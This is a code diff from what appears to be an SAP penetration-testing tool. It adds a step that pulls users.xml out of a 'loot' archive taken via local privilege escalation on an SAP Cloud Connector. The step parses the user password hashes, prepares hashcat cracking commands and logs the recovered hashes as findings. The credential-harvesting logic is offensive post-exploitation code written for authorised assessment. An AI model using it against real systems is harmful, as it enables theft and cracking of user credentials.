@@ -954,6 +954,70 @@ def harvest_scc_hashes_via_lpe(node: SAPNode, state: SAPMAPState) -> dict:
     except Exception as se:
         logger.debug(f"scc_hashes_via_lpe ssfs decrypt: {se}")
 
+    # ---- Phase 5: extract users.xml → plaintext cache + hash parse
+    # So that the frontend's "Download Password Hashes" picks it up
+    # instantly via Path 0 (cached plaintext) and the hashes modal
+    # + hashes.com auto-lookup fire without a second OS-exec round trip.
+    try:
+        import tarfile as _tf
+        xml_bytes = None
+        with _tf.open(loot_path, "r:gz") as tar:
+            for member in tar.getmembers():
+                if member.name.endswith("users.xml"):
+                    f = tar.extractfile(member)
+                    if f:
+                        xml_bytes = f.read()
+                        break
+        if xml_bytes:
+            xml_path = os.path.join(loot_dir, "users.xml")
+            with open(xml_path, "wb") as fh:
+                fh.write(xml_bytes)
+            try:
+                os.chmod(xml_path, 0o600)
+            except Exception:
+                pass
+            scc_addr = node.ip or node.hostname or ""
+            for sn in state.scc_nodes.values():
+                sn_addr = sn.ip or sn.host or ""
+                if sn_addr and sn_addr == scc_addr:
+                    sn.users_xml_loot_path = xml_path
+                    break
+            print(f"[+] {sid}: scc_hashes_via_lpe — users.xml extracted "
+                  f"→ {xml_path} ({len(xml_bytes)} B)")
+            result["users_xml_path"] = xml_path
+
+            from sapmap_scc_keystore import parse_user_hashes_from_xml
+            hr = parse_user_hashes_from_xml(xml_bytes)
+            if hr.get("ok"):
+                users = hr["users"]
+                result["users"] = users
+                result["hashcat_commands"] = hr.get("hashcat_commands", [])
+                for u in users:
+                    if u.get("hash_hex"):
+                        emit_finding(
+                            "HIGH", scc_addr or sid,
+                            f"SCC password hash recovered for "
+                            f"'{u['username']}' "
+                            f"({u.get('algorithm', '?')}, "
+                            f"roles={u.get('roles', '?')}) via LPE",
+                            ref="scc.users.hash_recovered",
+                            meta={"username": u["username"],
+                                  "algorithm": u.get("algorithm"),
+                                  "hashcat_mode": u.get("hashcat_mode"),
+                                  "roles": u.get("roles")},
+                            attack_capability="creds.user_password_hash")
+                n_hashes = sum(1 for u in users if u.get("hash_hex"))
+                print(f"[+] {sid}: scc_hashes_via_lpe — {len(users)} "
+                      f"user(s), {n_hashes} hash(es) parsed")
+            else:
+                print(f"[-] {sid}: scc_hashes_via_lpe — users.xml parse "
+                      f"failed: {hr.get('error')}")
+        else:
+            print(f"[-] {sid}: scc_hashes_via_lpe — users.xml not found "
+                  f"in tar archive")
+    except Exception as ue:
+        logger.debug(f"scc_hashes_via_lpe users.xml extract: {ue}")
+
     result["ok"] = True
     return result
 
